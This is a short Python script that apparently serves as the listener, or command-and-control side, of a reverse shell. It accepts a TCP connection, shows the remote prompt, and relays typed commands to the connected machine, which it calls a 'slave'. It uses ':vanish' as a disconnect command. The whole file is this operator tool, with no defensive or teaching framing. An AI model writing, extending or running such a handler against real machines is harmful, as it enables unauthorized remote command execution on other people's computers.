import socket
import subprocess
import time
import os

class Server(object):
    def __init__(self, host, port):
        self.__host = host
        self.__port = port
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__sock.bind((host, port))

    def listen(self):
        self.__sock.listen(1)

        while True:
            print('Listening for incoming TCP connections on: ' + self.__host + ':' + str(self.__port))
            conn, addr = self.__sock.accept()
            print('Got a connection from: ' + str(addr))

            while True:
                cmd = input(conn.recv(1024).decode())
                conn.send(cmd.encode())
                if cmd == ':vanish':
                    print('Slave vanished.\n')
                    break


if __name__ == '__main__':
    Server('127.0.0.1', 8080).listen()
